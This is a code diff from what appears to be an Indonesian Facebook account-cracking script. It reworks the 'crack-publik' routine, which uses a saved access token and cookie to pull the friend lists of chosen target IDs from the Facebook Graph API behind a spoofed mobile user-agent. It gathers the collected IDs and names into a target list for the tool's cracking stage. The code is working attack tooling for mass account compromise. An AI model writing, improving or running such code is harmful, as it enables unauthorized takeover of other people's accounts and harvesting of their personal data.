@@ -369,7 +369,7 @@ def menu(my_name, my_id):
     elif HAMA in ['1']:
         crack_file()
     elif HAMA in ['2','02']:
-        dump_massal()
+        nge_krek()
     elif HAMA in ['0']:
         os.system('rm -rf .token.txt')
         os.system('rm -rf .cookie.txt')
@@ -448,57 +448,68 @@ def dump_massal():
  
 #-------------------[ CRACK-PUBLIK ]----------------#
  
-def dump_massal():
+def nge_krek():
     try:
-        token = open('.token.txt','r').read()
-        cok = open('.cok.txt','r').read()
+        token = open('.token.txt', 'r').read()
+        cok = open('.cok.txt', 'r').read()
     except IOError:
+        print(f'{m}cookies telah kadaluarsa ster')
         exit()
     try:
-        print('\033[0;91m==================')
-        jum = int(input(' \033[97;1m[\033[92;1m•\033[97;1m] ENTER TARGET AMOUNT  : '))
-        print('\033[0;91m==================')
+        dwi = int(input(f"\x1b[1;92m└──C CHAN ID DAWE ?:  "))
     except ValueError:
-        print('\033[0;91m==================')
-        animation(' [×] INVALID OPTION ')
         exit()
-    if jum<1 or jum>100000000:
-        print('\033[0;91m==================')
-        animation(' [×] TRY AGAIN ')
+    if dwi < 1 or dwi > 1000:
         exit()
-    ses=requests.Session()
-    yz = 0
-    for met in range(jum):
-        yz+=1
-        kl = input(' \033[97;1m[\033[92;1m•\033[97;1m] INPUT UID '+str(yz)+' : ')
-        uid.append(kl)
-    for userr in uid:
+    ses = requests.Session()
+    _dwi_ = 0
+    for yantti in range(dwi):
+        _dwi_ += 1
+        Masukan = input(f"\x1b[1;92m└── ID DANE {_dwi_}: ")
+        uid.append(Masukan)
+    for user in uid:
         try:
-            col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
-            for mi in col['friends']['data']:
+            head = (
+                {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
+                 })
+            if len(id) == 0:
+                params = (
+                    {
+                        'access_token': token,
+                        'fields': "friends"
+                    }
+                )
+            else:
+                params = (
+                    {
+                        'access_token': token,
+                        'fields': "friends"
+                    }
+                )
+            url = requests.get('https://graph.facebook.com/{}'.format(user),
+                               params=params, headers=head, cookies={'cookies': cok}).json()
+            for proses in url['friends']['data']:
                 try:
-                    iso = (mi['id']+'|'+mi['name'])
-                    if iso in id:pass
-                    else:id.append(iso)
-                except:continue
-        except (KeyError,IOError):
+                    woy = (proses['id']+'|'+proses['name'])
+                    if woy in id:
+                        pass
+                    else:
+                        id.append(woy)
+                except:
+                    continue
+        except (KeyError, IOError):
             pass
         except requests.exceptions.ConnectionError:
-            print('\033[0;91m==================')
-            animation(' [×] TRY AGAIN ')
-            os.system('clear')
+            exit()
     try:
-        print('\033[0;91m==================')
-        print(f' \033[97;1m[\033[92;1m•\033[97;1m] IDYAKAN : \u001b[36m'+str(len(id))+'\033[1;37m')
-        setting()
+        print(f"└──C <(｡⁠◕⁠‿⁠◕⁠｡)⁠> ID TERKUMPUL : " +str(len(id)))
+        atur_dulu()
     except requests.exceptions.ConnectionError:
-        print(f'{u}')
-        back()
-    except (KeyError,IOError):
-        print('\033[0;91m==================')
-        animation(" [×] DUMP ID FAILED ")
-        time.sleep(3)
-        back()
+        print(f"{T}{M}  koneksi terputus")
+        exit()
+    except (KeyError, IOError):
+        print(f"{T}{M}  teman tidak publik")
+        exit()
  
 #-------------[ CRACK-FROM-FILE ]------------------#
  
